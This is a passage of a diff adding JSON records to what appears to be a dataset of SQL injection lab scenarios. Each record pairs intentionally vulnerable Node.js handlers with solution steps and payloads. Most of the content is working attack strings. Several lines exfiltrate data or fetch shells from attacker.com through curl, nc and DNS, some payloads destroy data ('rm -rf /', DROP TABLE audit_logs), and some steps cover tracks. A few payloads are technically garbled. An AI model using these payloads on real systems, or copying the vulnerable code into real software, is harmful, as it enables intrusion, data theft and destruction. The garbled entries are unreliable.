+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/register', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO users (username, comment) VALUES ('${req.body.user}', '${comment}')`;\n  \n  db.query(query, () => {\n    res.send('Registration pending approval');\n  });\n});",
+    "payloads": [
+      "'||(SELECT balance FROM accounts WHERE user='admin')--",
+      "'; UPDATE accounts SET balance=1000000 WHERE user='attacker'--"
+    ]
+  },
+  {
+    "Lab scenario": "REST API Gateway UNION SQLi in JSON Parameter",
+    "Lab Description": "Inventory API processes JSON array input without validation. To solve: Bypass WAF protections and extract database schema through UNION attacks.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Modify Content-Type to application/json",
+      "Craft JSON payload: {\"filter\":[\"1' UNION SELECT version(),NULL--\"]}",
+      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
+      "Extract schema via information_schema.tables",
+      "Encode results in base64"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/inventory', (req, res) => {\n  const filters = req.body.filter.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "\"1' UNION SELECT table_name,column_name FROM information_schema.columns--",
+      "\"1' UNION SELECT encode(convert_to(pg_read_file('/etc/passwd'),'base64'),'hex'--"
+    ]
+  },
+  {
+    "Lab scenario": "Government Portal Out-of-Band SQLi in PDF Generator",
+    "Lab Description": "Report generation feature allows DNS exfiltration through malicious SQL queries. To solve: Extract sensitive records using OOB techniques.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Set up DNS listener with Burp Collaborator",
+      "Craft payload: ' || (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users),'.attacker.com\\\\test.txt')))--",
+      "Trigger PDF report generation",
+      "Monitor DNS queries for exfiltrated data",
+      "Bypass firewall using alternate protocols"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/generate-report', (req, res) => {\n  const params = req.body.params;\n  const query = `SELECT * FROM citizens WHERE ${params}`;\n  \n  // Runs query and generates PDF\n  generatePDF(query);\n});",
+    "payloads": [
+      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test'))--",
+      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT password))))--"
+    ]
+  },
+  {
+    "Lab scenario": "Social Media Platform Filter Evasion SQLi",
+    "Lab Scenario": "Search feature with WAF blocking common SQLi patterns. To solve: Bypass filters using alternative syntax and encoding.",
+    "Lab Description": "The application uses a web application firewall blocking UNION and SELECT keywords. To solve: Extract user emails using alternative syntax and comment bypasses.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Identify allowed characters using Postman fuzzing",
+      "Bypass WAF using %00 NULL bytes",
+      "Use alternative syntax: ' || (SELECT 1 FROM users)::text --",
+      "Exfiltrate data via case-sensitive keywords",
+      "Use alternative comment syntax: /*!50000SELECT*/"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/[;'-]/g, '');\n  const query = `SELECT * FROM posts WHERE content LIKE '%${term}%'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "'%00UNION%00SELECT%00email%00FROM%00users--",
+      "'/**/OR/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)--"
+    ]
+  },
+  {
+    "Lab scenario": "Education Platform JWT-Triggered SQLi",
+    "Lab Description": "User dashboard vulnerable to SQLi through JWT claims. To solve: Modify JWT to inject SQL payloads through user ID claim.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Decode JWT using jwt.io",
+      "Modify sub claim to: ' OR admin=true--",
+      "Sign with null signature algorithm",
+      "Extract password hashes via UNION attack",
+      "Crack hashes using John The Ripper"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/dashboard', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
+    "payloads": [
+      "' UNION SELECT password,NULL FROM users--",
+      "'; UPDATE users SET password='hacked' WHERE id='admin'--"
+    ]
+  },
+  {
+    "Lab scenario": "Logistics Tracking System Polyglot SQLi in XML Parameter",
+    "Lab Description": "Shipment tracking API vulnerable through XML/SQL polyglot payloads. To solve: Achieve RCE via stacked queries and COPY FROM PROGRAM.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft XML payload containing SQL statements",
+      "Bypass parser using CDATA sections",
+      "Execute OS commands: '; COPY logs FROM PROGRAM 'curl attacker.com/shell.sh'--",
+      "Create reverse shell using netcat",
+      "Clean logs using VACUUM command"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/track', (req, res) => {\n  const xml = req.body.xml;\n  const trackingId = extractXPath(xml, '//id');\n  const query = `SELECT * FROM shipments WHERE id='${trackingId}'`;\n  \n  db.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
+    "payloads": [
+      "'%3BCOPY%20files%20FROM%20PROGRAM%20'rm%20-rf%20/'--",
+      "<![CDATA[' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--]]>"
+    ]
+  },
+  {
+    "Lab scenario": "Healthcare Portal Error-Based SQLi in HAVING Clause",
+    "Lab Description": "A hospital's patient statistics dashboard allows filtering by department and uses the user input directly in the HAVING clause of a SQL query. Due to lack of input sanitization, attackers can trigger error-based SQL injection to extract sensitive database metadata. This lab demonstrates exploitation using PostgreSQL type casting errors and common table expressions (CTEs) to enumerate tables and leak medical record IDs.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept the GET /stats request using Burp Suite or a proxy tool",
+      "Inject into the filter parameter: 1=CAST((SELECT current_database()) AS INTEGER)--",
+      "Observe the error message returned by PostgreSQL and use it to infer schema names",
+      "Construct payloads with UNION or CTE to enumerate medical records"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/stats', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT department, COUNT(*) FROM patients GROUP BY department HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--",
+      "1=1 AND (SELECT 1 FROM patient_records WHERE ssn LIKE '123%')=1--"
+    ]
+  },
+  {
+    "Lab scenario": "IoT Device Time-Based SQLi via MQTT Protocol",
+    "Lab Description": "An MQTT broker receives JSON-encoded telemetry data from smart devices and writes it to a SQL database. Since the MQTT handler does not sanitize incoming values, attackers can inject SQL into the `device_id` field. This lab explores time-based SQL injection to exfiltrate API keys from the database by measuring conditional delays caused by `pg_sleep`.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture MQTT messages from a compromised or test IoT device",
+      "Inject a time delay: '; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100) THEN pg_sleep(5) END FROM devices--",
+      "Use a timing-based measurement tool or script to determine when delays occur",
+      "Automate full key extraction using a binary search script"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "mqttClient.on('message', (topic, msg) => {\n  const data = JSON.parse(msg);\n  const query = `INSERT INTO telemetry (device_id, value) VALUES ('${data.id}', '${data.value}')`;\n  pool.query(query);\n});",
+    "payloads": [
+      "'; SELECT pg_sleep(5) FROM devices WHERE id=1--",
+      "'||(SELECT CASE WHEN (SELECT COUNT(*) FROM api_keys)=3 THEN pg_sleep(2) END)--"
+    ]
+  },
+  {
+    "Lab scenario": "CMS Second-Order SQLi in User Registration",
+    "Lab Description": "A content management system stores user input during registration and later uses it unsanitized during scheduled report generation. This lab demonstrates second-order SQL injection, where malicious data triggers SQL execution not during entry, but during later backend processing (e.g., admin reporting or logs).",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Register with a malicious username: admin'||(SELECT CURRENT_USER))--",
+      "Wait for the system to run its daily scheduled report that includes user data",
+      "Review the exported report or admin panel for executed SQL results"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/register', (req, res) => {\n  const username = req.body.username;\n  const query = `INSERT INTO users (username) VALUES ('${username}')`;\n  pool.query(query);\n  res.send('Pending approval');\n});",
+    "payloads": [
+      "test'||(SELECT pg_read_file('/etc/passwd'))--",
+      "admin'||(COPY (SELECT * FROM secrets) TO PROGRAM 'curl attacker.com?exfil=$(data)'--"
+    ]
+  },
+  {
+    "Lab scenario": "Banking Portal Boolean-Blind SQLi in Transaction Search",
+    "Lab Description": "The transaction search feature returns true/false based on user-defined queries. Since there's no direct error or output, Boolean-based blind SQL injection is needed. Attackers can infer information like account balances by manipulating the query logic and observing application behavior.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft queries with true/false conditions using the AND operator",
+      "Submit queries via the /search endpoint and observe response changes",
+      "Use tools like sqlmap with --technique=B for automated exploitation",
+      "Perform binary search to guess numeric values like balances"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const query = req.body.query;\n  const sql = `SELECT EXISTS(SELECT 1 FROM transactions WHERE ${query})`;\n  pool.query(sql, (err, result) => {\n    res.json({ found: result.rows[0].exists });\n  });\n});",
+    "payloads": [
+      "description LIKE '%test%' AND (SELECT SUBSTR(CAST(balance AS TEXT),1,1) FROM accounts)='5'--",
+      "amount > 0 AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Filter Evasion SQLi with Unicode Bypass",
+    "Lab Description": "The product search field filters user input by stripping single quotes, but it fails to detect alternate encodings. Attackers can exploit this by using Unicode-encoded apostrophes to bypass the sanitization and extract payment data from the backend.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Send URL-encoded requests using %u0027 instead of standard apostrophes",
+      "Inject UNION SELECT queries using alternate encodings",
+      "Decode hex or base64-encoded results returned in JSON"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/'/g, '');\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "%u0027 UNION SELECT NULL,pan,NULL FROM payments--",
+      "%u0027 OR 1=CAST((SELECT COUNT(*) FROM payments) AS INTEGER)--"
+    ]
+  },
+  {
+    "Lab scenario": "Logistics Tracking Out-of-Band SQLi via DNS",
+    "Lab Description": "A vulnerable shipment tracker constructs SQL queries from user input and allows attackers to trigger out-of-band SQLi using DNS exfiltration. This lab illustrates exfiltrating AWS keys via DNS queries using the `LOAD_FILE` or `MAKE_SET` functions.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Deploy a DNS listener or Burp Collaborator server",
+      "Craft payloads that call out to your DNS server with secrets",
+      "Monitor DNS logs for stolen data",
+      "Use the stolen data in an AWS environment"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/track', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT * FROM shipments WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT secret_key)))--",
+      "' UNION SELECT NULL,ENCODE(pg_read_binary_file('/etc/passwd'),'base64')--"
+    ]
+  },
+  {
+    "Lab scenario": "Social Media JWT-Triggered SQLi in Profile Load",
+    "Lab Description": "The application uses JWT tokens and places the 'sub' claim directly into SQL queries to load user profiles. An attacker can forge a token and manipulate the claim to perform SQL injection. This lab demonstrates bypassing authentication and accessing another user's messages.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Decode the JWT token and modify the 'sub' field to: ' OR 1=1--",
+      "Re-sign the token using 'alg':'none' or a leaked key",
+      "Access the /profile endpoint with the modified JWT",
+      "Review the returned messages"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.authorization).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,message,NULL FROM inbox--",
+      "'||(SELECT group_concat(message) FROM inbox)--"
+    ]
+  },
+  {
+    "Lab scenario": "Education Platform Stacked SQLi in CSV Export",
+    "Lab Description": "An export feature accepts filtering criteria in a query used in PostgreSQL's COPY command. Lack of sanitization allows stacked SQL queries. This lab shows how attackers can chain malicious SQL to perform remote command execution (RCE) via COPY FROM PROGRAM.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Inject a stacked query into the export filter: ; COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
+      "Trigger the report/export generation",
+      "Verify RCE by checking listener or shell connection"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n  pool.query(query);\n  res.attachment('grades.csv');\n});",
+    "payloads": [
+      "; CREATE TABLE exfil AS SELECT * FROM passwords--",
+      "; DROP TABLE audit_logs;--"
+    ]
+  },
+  {
+    "Lab scenario": "Government Portal XML SQLi in SOAP Service",
+    "Lab Description": "A SOAP endpoint accepts XML input and uses XPath to extract user input before inserting it into a SQL query. This allows hybrid XML-SQL injection. Attackers can use CDATA or entity expansion to inject SQL and retrieve citizen SSNs from the database.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft an XML payload with SQL injection wrapped in CDATA",
+      "Submit to the /soap endpoint",
+      "Parse the resulting XML for leaked data",
+      "Use entity encoding to bypass XML parsers"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/soap', (req, res) => {\n  const xml = req.rawBody;\n  const id = extractXPath(xml, '//citizen_id');\n  const query = `SELECT * FROM citizens WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
+    "payloads": [
+      "<![CDATA[' UNION SELECT ssn,NULL FROM citizens--]]>",
+      "'||(SELECT xmlagg(xmlelement(name data, ssn)) FROM citizens)--"
+    ]
+  },
+  {
+    "Lab scenario": "Pharmacy Management System Error-Based SQLi in HAVING Clause",
+    "Lab Description": "A medication inventory system generates reports using vulnerable HAVING conditions. The PostgreSQL backend returns verbose type conversion errors containing sensitive data. The application aggregates results from multiple tables but fails to sanitize the 'threshold' parameter. To solve: Extract patient SSNs by forcing mismatched data type errors through controlled CAST operations.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept POST /reports request with Burp Suite",
+      "Inject: HAVING 1=CAST((SELECT ssn FROM patients LIMIT 1) AS INTEGER)--",
+      "Analyze error message for full SSN leakage",
+      "Automate extraction using recursive CTE expressions",
+      "Bypass column masking through multiple error triggers"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/reports', (req, res) => {\n  const threshold = req.body.threshold;\n  const query = `SELECT medication, COUNT(*) FROM prescriptions \n    GROUP BY medication HAVING COUNT(*) > ${threshold}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "100 UNION SELECT CAST(ssn AS INTEGER) FROM patients--",
+      "1=CAST((SELECT current_setting('data_directory')) AS NUMERIC)--"
+    ]
+  },
+  {
+    "Lab scenario": "Insurance Claim System UNION-Based SQLi with Type Juggling",
+    "Lab Description": "A claims processing portal constructs dynamic UNION queries using unsanitized user input in the 'document_type' parameter. The MySQL backend performs implicit type conversion between JSON and string types. To solve: Bypass column type checks using JSON_ARRAY and extract adjuster credentials.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Identify injectable parameter through fuzzing with OWASP ZAP",
+      "Determine column count using ORDER BY with JSON_LENGTH",
+      "Craft payload: medical UNION SELECT JSON_ARRAY(adjuster_id,password) FROM adjusters--",
+      "Handle JSON parsing anomalies in claim results",
+      "Decode base64-embedded credentials in nested objects"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/claims', (req, res) => {\n  const type = req.query.document_type;\n  const query = `SELECT id, details FROM claims WHERE document_type='${type}' \n    UNION SELECT id, document FROM archived_claims`;\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
+    "payloads": [
+      "medical' UNION SELECT 1,JSON_OBJECT('user',adjuster,'pass',password) FROM adjusters--",
+      "dental' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Reviews",
+    "Lab Description": "A product review system stores unsanitized user comments that later get used in inventory management SQL queries. The Node.js backend escapes output but not storage. To solve: Poison the review system with delayed payloads that trigger during stock reconciliation cron jobs.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Submit review with payload: '||(SELECT pg_sleep(10) FROM products)--",
+      "Monitor cron job execution timing via server logs",
+      "Construct payload to copy database to public directory",
+      "Access stolen DB copy via /static/backup.sql",
+      "Cover tracks through VACUUM and log rotation"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/reviews', (req, res) => {\n  const review = req.body.text;\n  const query = `INSERT INTO reviews (product_id, text) \n    VALUES (${req.params.id}, '${review}')`;\n  pool.query(query);\n  res.redirect('/product');\n});",
+    "payloads": [
+      "Great product!'||(SELECT pg_dump('public')::text)--",
+      "Awesome!'||(COPY products TO PROGRAM 'nc attacker.com 4444')--"
+    ]
+  },
+  {
+    "Lab scenario": "Telemedicine Platform JSON Path SQLi in Patient Search",
+    "Lab Description": "A patient lookup feature uses JSONB path expressions in PostgreSQL with unsanitized input. The system allows path traversal via lateral joins. To solve: Extract mental health records by abusing jsonb_to_recordset function in WHERE clause.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Identify vulnerable JSON path parameter through fuzzing",
+      "Escape JSON context using @? operator: ' || (SELECT jsonb_build_object('data', notes))--",
+      "Use lateral joins to access adjacent tables",
+      "Bypass field-level encryption through memory inspection",
+      "Decrypt results using leaked AWS KMS credentials"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const path = req.body.jsonPath;\n  const query = `SELECT * FROM patients \n    WHERE metadata @? '${path}'::jsonpath`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "$..* ? (@.sensitive == true)",
+      "lax $.** ! (@.redacted == true)"
+    ]
+  },
+  {
+    "Lab scenario": "Banking Transaction Audit System - UNION-Based SQLi in CSV Export",
+    "Lab Description": "A financial auditing feature generates CSV reports using unsanitized input in ORDER BY clauses. The Oracle backend allows UNION injection through numeric column manipulation. Error messages reveal full query structure but are masked in production. To solve: Extract SWIFT codes from international_transfers table while maintaining column type consistency and bypassing CSV escaping mechanisms.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept POST /audit/export request with Burp Suite",
+      "Identify injectable parameter: sort=transaction_date",
+      "Determine column count: ' ORDER BY 7-- (throws error at 8)",
+      "Craft type-compatible payload: ' UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
+      "Bypass CSV encapsulation using CHR(9) tab separation"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/audit/export', (req, res) => {\n  const sortColumn = req.body.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sortColumn}`;\n  // Vulnerable CSV generation\n  oracle.execute(query, (err, result) => {\n    const csv = result.rows.map(r => Object.values(r).join(',')).join('\\n');\n    res.attachment('report.csv').send(csv);\n  });\n});",
+    "payloads": [
+      "transaction_date UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
+      "amount UNION SELECT NULL,TO_CHAR(DBMS_LOB.SUBDOMAIN(secret_doc,1000,1)),NULL,NULL,NULL,NULL,NULL FROM internal_docs--"
+    ]
+  },
+  {
+    "Lab scenario": "CMS Time-Based SQLi in User Registration",
+    "Lab Description": "The user registration form stores unsanitized input used in password reset emails. The MySQL backend allows time-based injection through delayed query execution. To solve: Extract administrator password hash through conditional SLEEP operations.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Register user with payload: ' OR IF(ASCII(SUBSTR(password,1,1))>97, SLEEP(3), 0)--",
+      "Measure response times with Burp Suite's Repeater",
+      "Automate extraction using Python requests and timing analysis",
+      "Crack bcrypt hash using Hashcat",
+      "Login with compromised credentials"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/register', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO users (email) VALUES ('${email}')`;\n  console.debug('Raw query:', query); // Verbose logging\n  pool.query(query);\n  res.send('Confirmation email sent');\n});",
+    "payloads": [
+      "' OR IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0)--",
+      "' XOR (SELECT 1 FROM (SELECT SLEEP(5))slowQuery)--"
+    ]
+  },
+  {
+    "Lab scenario": "Healthcare Portal Error-Based SQLi in GROUP BY",
+    "Lab Description": "Patient statistics dashboard leaks PostgreSQL errors through vulnerable GROUP BY clause. The application displays full query syntax in debug mode. To solve: Extract medical record IDs using type conversion errors and CTE injections.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept /stats request with Burp Suite",
+      "Trigger error: ' GROUP BY CAST((SELECT ssn FROM patients) AS INTEGER)--",
+      "Extract sensitive data from verbose errors",
+      "Bypass column masking using multiple error triggers",
+      "Disable debug mode through parameter manipulation"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/stats', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group}, COUNT(*) FROM patients GROUP BY ${group}`;\n  console.error('Failed query:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "CASE WHEN 1=1 THEN diagnosis ELSE CAST((SELECT ssn) AS INTEGER) END--",
+      "CAST((SELECT current_database()) AS INTEGER)"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Platform Boolean-Based SQLi in Search",
+    "Lab Description": "Product search feature returns different HTTP status codes based on query truthiness. The SQLite backend allows boolean inference through response variation. To solve: Extract credit card numbers through binary search character extraction.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept POST /search with OWASP ZAP",
+      "Identify boolean trigger: ' OR 1=1 AND 'a'='a",
+      "Automate with sqlmap: sqlmap -r request.txt --technique=B",
+      "Brute-force PAN using bitwise operations",
+      "Validate cards through payment API endpoint"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const term = req.body.query;\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
+    "payloads": [
+      "' OR (SELECT COUNT(*) FROM payments WHERE SUBSTR(pan,1,1)='4')=1--",
+      "' AND (SELECT LENGTH(pan) FROM payments)=16--"
+    ]
+  },
+  {
+    "Lab scenario": "Social Media Platform JWT-SQLi in Profile Load",
+    "Lab Description": "User profile endpoint uses JWT claims directly in SQL queries. The application allows JWT algorithm none and has broken signature validation. To solve: Forge admin token and extract private messages through UNION attacks.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Decode JWT using jwt.io",
+      "Modify 'sub' claim to: ' UNION SELECT message FROM inbox--",
+      "Sign with 'none' algorithm",
+      "Bypass CSRF protection using CORS misconfiguration",
+      "Extract messages from API response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,message,NULL FROM inbox--",
+      "'||(SELECT group_concat(message) FROM inbox)--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Platform UNION-Based SQLi in Product Filter",
+    "Lab Description": "The product search feature directly concatenates user input into a WHERE clause with no parameterization. The MySQL backend returns verbose errors containing database structure details. The application executes: SELECT * FROM products WHERE category = '${input}' AND status = 1. To solve: Extract customer credit card numbers through UNION attacks while bypassing column type restrictions.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept GET /products?category=electronics with Burp Suite",
+      "Determine column count using ORDER BY 6--",
+      "Identify numeric columns through error analysis",
+      "Craft payload: ' UNION SELECT NULL,pan,NULL,NULL,NULL,NULL FROM payments--",
+      "Bypass WAF using HTML entity encoding"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products WHERE category = '${category}'`;\n  console.error('Query failed:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
+    "payloads": [
+      "electronics' UNION SELECT 1,pan,3,4,5,6 FROM payments--",
+      "' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL--"
+    ]
+  },
+  {
+    "Lab scenario": "Government Portal Boolean-Blind SQLi in Document Search",
+    "Lab Description": "The public records search feature uses unsanitized input in a HAVING clause with identical 200/404 responses. The PostgreSQL backend allows boolean inference through response existence checks. The application executes: SELECT doc_id FROM archives GROUP BY doc_id HAVING ${input}. To solve: Extract classified document titles through binary search character extraction.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Fuzz HAVING parameter with OWASP ZAP",
+      "Identify boolean trigger: ' OR 1=1 AND '1'='1",
+      "Automate with sqlmap: sqlmap -u ... --technique=B --dbms=PostgreSQL",
+      "Brute-force titles using SUBSTR and ASCII comparisons",
+      "Reconstruct documents from extracted fragments"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT doc_id FROM archives GROUP BY doc_id HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    res.status(result.rowCount > 0 ? 200 : 404).send();\n  });\n});",
+    "payloads": [
+      "1=1 AND (SELECT SUBSTR(title,1,1) FROM classified_docs)='T'",
+      "EXISTS(SELECT 1 FROM restricted WHERE clearance_level > 5)"
+    ]
+  },
+  {
+    "Lab scenario": "Social Media Platform Second-Order SQLi in Comments",
+    "Lab Description": "Comment storage system escapes output but not input validation, allowing second-order injection in analytics reports. The application executes: INSERT INTO comments (text) VALUES ('${input}') and later SELECT * FROM comments WHERE ${reportFilter}. To solve: Poison comment system to execute malicious payloads during report generation.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Post comment: '||(SELECT CURRENT_USER))--",
+      "Wait for daily report generation cron job",
+      "Exploit time-delayed payload execution",
+      "Exfiltrate OAuth tokens through DNS subdomains",
+      "Clean logs through parameter tampering"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/comment', (req, res) => {\n  const text = req.body.text;\n  const query = `INSERT INTO comments (text) VALUES ('${text}')`;\n  console.debug('New comment:', query); // Verbose logging\n  pool.query(query);\n  res.send('Comment posted');\n});",
+    "payloads": [
+      "'||(COPY (SELECT * FROM oauth_tokens) TO PROGRAM 'curl https://attacker.com?exfil=$(data)'--",
+      "'||(SELECT pg_sleep(10) FROM users)--"
+    ]
+  },
+  {
+    "Lab scenario": "Education Platform Error-Based SQLi in Gradebook",
+    "Lab Description": "Online gradebook system leaks MySQL errors through vulnerable GROUP BY clause. The application executes: SELECT student_id FROM grades GROUP BY ${input}. To solve: Extract hashed passwords through type conversion errors and UNION payloads.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept POST /gradebook request with Burp Suite",
+      "Trigger error: GROUP BY CAST((SELECT password FROM admins) AS INTEGER)--",
+      "Extract bcrypt hashes from error messages",
+      "Bypass column count restrictions using NULL padding",
+      "Crack hashes using rainbow tables"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/gradebook', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT student_id FROM grades GROUP BY ${group}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.sqlMessage); // Error leakage\n    else res.json(result);\n  });\n});",
+    "payloads": [
+      "student_id UNION SELECT NULL,password,NULL FROM admins--",
+      "CAST((SELECT email FROM students) AS UNSIGNED)"
+    ]
+  },
+  {
+    "Lab scenario": "Shipping Logistics UNION SQLi in Tracking API",
+    "Lab Description": "Package tracking system incorporates user input directly into ORDER BY clauses. The application executes: SELECT * FROM shipments ORDER BY ${input}. To solve: Extract sensitive customer addresses through UNION attacks with explicit type casting.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept GET /track?sort=status with Postman",
+      "Determine column count using incremental ORDER BY",
+      "Identify VARCHAR columns through NULL replacement",
+      "Craft payload: status UNION SELECT NULL,address,NULL FROM customers--",
+      "Bypass WAF using multiline comments"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/track', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT id, status FROM shipments ORDER BY ${sort}`;\n  console.log('Tracking query:', query); // Verbose logging\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
